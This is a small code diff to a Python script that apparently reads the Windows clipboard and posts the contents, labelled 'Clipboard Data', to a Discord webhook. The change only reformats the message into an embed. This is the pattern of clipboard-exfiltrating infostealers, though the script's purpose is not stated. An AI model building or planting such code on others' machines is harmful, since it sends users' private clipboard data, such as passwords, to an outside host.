@@ -3,7 +3,7 @@ import win32clipboard
 import requests
 import json
 
-# Replace <YOUR_DISCORD_WEBHOOK_URL> with your webhook url
+# Replace <YOUR_DISCORD_WEBHOOK_URL> with the actual webhook URL
 DISCORD_WEBHOOK_URL = '<YOUR_DISCORD_WEBHOOK_URL>'
 
 def send_discord_message(message):
@@ -11,7 +11,10 @@ def send_discord_message(message):
     Sends a message to a Discord server using a webhook.
     """
     payload = {
-        'content': message
+        'embeds': [{
+            'title': 'Clipboard Data',
+            'description': message
+        }]
     }
     headers = {
         'Content-Type': 'application/json'
